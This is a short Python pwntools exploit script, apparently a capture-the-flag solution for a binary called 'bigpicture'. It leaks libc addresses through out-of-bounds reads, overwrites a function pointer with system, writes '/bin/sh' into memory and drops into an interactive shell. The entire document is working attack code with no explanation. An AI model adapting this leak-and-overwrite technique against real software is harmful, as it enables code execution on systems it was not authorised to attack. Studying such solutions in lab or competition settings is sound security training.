from pwn import *

s = process("./bigpicture")

s.clean()

s.sendline("1 x 135138")

gi_offset = 4053536
get_offset = -1986496 + 8

s.clean()
buf = ""
for i in xrange(6):
	s.sendline("0, %d, A" % (get_offset+i))
	s.readuntil("overwriting ")
	buf += s.readline()[0]

print hex(u64(buf+"\x00"*2))
libcBase = u64(buf+"\x00"*2)-gi_offset

libc = s.libc

libc.base = libcBase

system = p64(libc.symbols["system"])

for i in xrange(8):
	s.sendline("0, %d, %c" %(-1960040-0x4000+i, system[i]))

binsh = "/bin/sh"
for i in xrange(len(binsh)):
	s.sendline("0, %d, %c" % (i, binsh[i]))

s.sendline("wioefjoiwejfoiwjeoif")
s.interactive()
